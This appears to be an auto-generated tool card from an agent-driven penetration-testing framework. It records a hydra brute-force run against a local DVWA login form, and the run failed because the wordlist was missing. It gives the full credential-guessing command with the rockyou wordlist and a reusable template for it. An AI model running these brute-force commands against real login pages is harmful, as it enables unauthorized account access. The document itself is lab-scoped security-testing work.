# hydra-http

## Tool Name & Category
- **Name:** hydra-http
- **Category:** auth (Authentication Brute Force — credential attacks, hash cracking)
- **Binary:** `hydra`
- **Agent:** auth
- **DVWA-optimized:** True

## Official Purpose
HTTP form brute force

## Exact Command(s) Executed
```bash
# Safety check: read-only/lab-safe against local Docker targets only
hydra -l admin -P /usr/share/wordlists/rockyou.txt aegis-target http-get-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect'
```

**Target:** `http://aegis-target`  
**Duration:** 0.15s | **Exit code:** 255

## Full Output Summary
```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-24 05:11:27
[ERROR] File for passwords not found: /usr/share/wordlists/rockyou.txt

```

## What I Learned / Edge Cases / Gotchas
- Binary not installed in Kali container — apt install required
- Registry template: `hydra -l admin -P /usr/share/wordlists/rockyou.txt {host} http-get-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect' {extra}`
- Tags: none

## Effectiveness on This Target (1-10)
**1/10** — Limited output or tool not fully installed

## Recommended Safe Parameters for Learning Labs
- --batch --risk=1 --level=1 for injection tools; -T4 for nmap; target=http://aegis-target only; no destructive flags
- Timeout: 90s (capped for batch run)
- Always scope to `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) from host
- Use `aegis-target` / `aegis-juice` hostnames from inside Kali container network

---
*GrokStrike v1.0 — 2026-06-24T05:11:27.852134+00:00*
